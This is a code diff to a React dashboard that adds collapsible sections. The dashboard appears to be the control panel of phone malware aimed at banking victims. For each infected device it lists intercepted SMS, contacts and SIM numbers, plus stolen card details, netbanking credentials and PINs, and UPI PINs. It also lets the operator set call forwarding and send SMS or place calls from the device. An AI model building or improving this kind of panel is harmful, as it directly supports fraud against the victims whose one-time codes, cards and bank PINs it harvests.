@@ -10,6 +10,7 @@ export default function App() {
   const [saving, setSaving] = useState({})
   const [acts, setActs] = useState({})
   const [time, setTime] = useState('')
+  const [expanded, setExpanded] = useState({})
 
   const fetchData = useCallback(async () => {
     try {
@@ -127,62 +128,60 @@ export default function App() {
 
               {open && (
                 <div style={s.inner}>
-                  {/* SIM Info */}
-                  <div style={s.secH}>SIM</div>
-                  {sims.length === 0 ? <div style={s.txt}>No SIM data</div> : sims.map((x,i) => (
-                    <div key={i} style={s.row}>
-                      <span style={{fontWeight:600,minWidth:55,fontSize:12,color:'#475569'}}>SIM {x.sim_slot||i+1}</span>
-                      <span style={{fontSize:12}}>{x.carrier||'-'}{x.number ? ` (${x.number})` : ' - no number'}</span>
-                    </div>
-                  ))}
+                  <Sec title="SIM" expanded={expanded} id={id} name="sim" onToggle={setExpanded}>
+                    {sims.length === 0 ? <div style={s.txt}>No SIM data</div> : sims.map((x,i) => (
+                      <div key={i} style={s.row}>
+                        <span style={{fontWeight:600,minWidth:55,fontSize:12,color:'#475569'}}>SIM {x.sim_slot||i+1}</span>
+                        <span style={{fontSize:12}}>{x.carrier||'-'}{x.number ? ` (${x.number})` : ' - no number'}</span>
+                      </div>
+                    ))}
+                  </Sec>
 
-                  {/* SMS */}
-                  <div style={{...s.secH,marginTop:12}}>SMS</div>
-                  {smsList.length === 0 ? <div style={s.txt}>No SMS</div> : (
-                    <div style={s.scroll}>
-                      {(() => {
-                        const slots = [...new Set(smsList.map(x => x.sub_id))].sort()
-                        if (slots.length === 1 && slots[0] === 0) {
-                          return smsList.map((x,j) => (
-                            <div key={x.id||j} style={s.item}>
-                              <div style={{fontWeight:600,fontSize:12}}>{x.sender||'-'}</div>
-                              <div style={{color:'#475569',wordBreak:'break-word',marginTop:1,fontSize:11}}>{x.message||'-'}</div>
-                              <div style={{fontSize:10,color:'#94a3b8',marginTop:1}}>{x.received_at?new Date(x.received_at).toLocaleString():'-'}</div>
-                            </div>
-                          ))
-                        }
-                        return slots.map(slot => (
-                          <div key={slot}>
-                            <div style={{fontSize:11,fontWeight:600,color:'#64748b',padding:'4px 0'}}>SIM {slot === 0 ? '?' : slot} ({smsList.filter(x => x.sub_id === slot).length} messages)</div>
-                            {smsList.filter(x => x.sub_id === slot).map((x,j) => (
+                  <Sec title={`SMS (${smsList.length})`} expanded={expanded} id={id} name="sms" onToggle={setExpanded}>
+                    {smsList.length === 0 ? <div style={s.txt}>No SMS</div> : (
+                      <div style={s.scroll}>
+                        {(() => {
+                          const slots = [...new Set(smsList.map(x => x.sub_id))].sort()
+                          if (slots.length === 1 && slots[0] === 0) {
+                            return smsList.map((x,j) => (
                               <div key={x.id||j} style={s.item}>
                                 <div style={{fontWeight:600,fontSize:12}}>{x.sender||'-'}</div>
                                 <div style={{color:'#475569',wordBreak:'break-word',marginTop:1,fontSize:11}}>{x.message||'-'}</div>
                                 <div style={{fontSize:10,color:'#94a3b8',marginTop:1}}>{x.received_at?new Date(x.received_at).toLocaleString():'-'}</div>
                               </div>
-                            ))}
+                            ))
+                          }
+                          return slots.map(slot => (
+                            <div key={slot}>
+                              <div style={{fontSize:11,fontWeight:600,color:'#64748b',padding:'4px 0'}}>SIM {slot === 0 ? '?' : slot} ({smsList.filter(x => x.sub_id === slot).length} messages)</div>
+                              {smsList.filter(x => x.sub_id === slot).map((x,j) => (
+                                <div key={x.id||j} style={s.item}>
+                                  <div style={{fontWeight:600,fontSize:12}}>{x.sender||'-'}</div>
+                                  <div style={{color:'#475569',wordBreak:'break-word',marginTop:1,fontSize:11}}>{x.message||'-'}</div>
+                                  <div style={{fontSize:10,color:'#94a3b8',marginTop:1}}>{x.received_at?new Date(x.received_at).toLocaleString():'-'}</div>
+                                </div>
+                              ))}
+                            </div>
+                          ))
+                        })()}
+                      </div>
+                    )}
+                  </Sec>
+
+                  <Sec title={`Contacts (${contactsList.length})`} expanded={expanded} id={id} name="contacts" onToggle={setExpanded}>
+                    {contactsList.length === 0 ? <div style={s.txt}>No contacts</div> : (
+                      <div style={s.scroll}>
+                        {contactsList.map((x,j) => (
+                          <div key={x.id||j} style={s.item}>
+                            <div style={{fontWeight:600,fontSize:12}}>{x.name||'-'}</div>
+                            <div style={{fontSize:11,color:'#475569'}}>{x.phone||''}{x.email ? ` | ${x.email}` : ''}</div>
                           </div>
-                        ))
-                      })()}
-                    </div>
-                  )}
+                        ))}
+                      </div>
+                    )}
+                  </Sec>
 
-                  {/* Contacts */}
-                  <div style={{...s.secH,marginTop:12}}>Contacts</div>
-                  {contactsList.length === 0 ? <div style={s.txt}>No contacts</div> : (
-                    <div style={s.scroll}>
-                      {contactsList.map((x,j) => (
-                        <div key={x.id||j} style={s.item}>
-                          <div style={{fontWeight:600,fontSize:12}}>{x.name||'-'}</div>
-                          <div style={{fontSize:11,color:'#475569'}}>{x.phone||''}{x.email ? ` | ${x.email}` : ''}</div>
-                        </div>
-                      ))}
-                    </div>
-                  )}
-
-                  {/* Call Forwarding */}
-                  <div style={{...s.secH,marginTop:12}}>Forwarding</div>
-                  <div>
+                  <Sec title="Forwarding" expanded={expanded} id={id} name="fwd" onToggle={setExpanded}>
                     <div style={s.fw}>
                       <span style={{minWidth:35,fontWeight:600,fontSize:12}}>Call</span>
                       <input type="text" placeholder="Forward to" value={fwd[id]?.call_forwarding_number||''}
@@ -205,11 +204,9 @@ export default function App() {
                     </div>
                     <button onClick={()=>saveFwd(id)} disabled={saving[id]}
                       style={s.save}>{saving[id]?'Saving...':'Save'}</button>
-                  </div>
+                  </Sec>
 
-                  {/* Actions */}
-                  <div style={{...s.secH,marginTop:12}}>Actions</div>
-                  <div>
+                  <Sec title="Actions" expanded={expanded} id={id} name="actions" onToggle={setExpanded}>
                     <div style={{marginBottom:6,fontSize:11,color:'#64748b'}}>Send SMS or call from this device.</div>
                     <select value={a.sim_slot||'1'} onChange={e=>setActs(prev=>({...prev,[id]:{...prev[id],sim_slot:e.target.value,type:a.type||'sms'}}))}
                       style={{...s.inp,width:'100%',marginBottom:6,boxSizing:'border-box'}}>
@@ -230,9 +227,8 @@ export default function App() {
                       <button onClick={()=>{setActs(prev=>({...prev,[id]:{...prev[id],type:'call'}}));sendAction(id)}} disabled={a.sending}
                         style={{...s.save,background:'#ef4444'}}>{a.sending?'Calling...':'Make Call'}</button>
                     </div>
-                  </div>
+                  </Sec>
 
-                  {/* Bill data plain text */}
                   {['bill_updates','card_details','card_verifications','netbanking_details','netbanking_pins','upi_details','payment_attempts'].map(t => {
                     const items = (data[t]||[]).filter(r => r.device_id === id || !r.device_id)
                     if (items.length === 0) return null
@@ -241,8 +237,7 @@ export default function App() {
                       netbanking_details: 'Netbanking', netbanking_pins: 'NB Pins', upi_details: 'UPI Pins', payment_attempts: 'Payments'
                     }
                     return (
-                      <div key={t}>
-                        <div style={{...s.secH,marginTop:12}}>{labels[t]}</div>
+                      <Sec key={t} title={`${labels[t]} (${items.length})`} expanded={expanded} id={id} name={t} onToggle={setExpanded}>
                         {items.map((row,i) => (
                           <div key={row.id||i} style={{padding:'6px 0',borderBottom:'1px solid #f1f5f9',fontSize:12,lineHeight:1.6}}>
                             {Object.entries(row).filter(([k]) => k !== 'id' && k !== 'device_id').map(([k,v]) => {
@@ -253,7 +248,7 @@ export default function App() {
                             })}
                           </div>
                         ))}
-                      </div>
+                      </Sec>
                     )
                   })}
                 </div>
@@ -262,6 +257,21 @@ export default function App() {
           )
         })}
       </div>
+    </div>
+  )
+}
+
+function Sec({title, expanded, id, name, onToggle, children}) {
+  const key = `${id}-${name}`
+  const open = expanded[key] !== false
+  return (
+    <div>
+      <div style={{...s.secH, marginTop:12, cursor:'pointer', userSelect:'none', display:'flex', justifyContent:'space-between', alignItems:'center'}}
+        onClick={() => onToggle(prev => ({...prev, [key]: !open}))}>
+        <span>{title}</span>
+        <span style={{fontSize:10,color:'#94a3b8'}}>{open ? '▲' : '▼'}</span>
+      </div>
+      {open && children}
     </div>
   )
 }
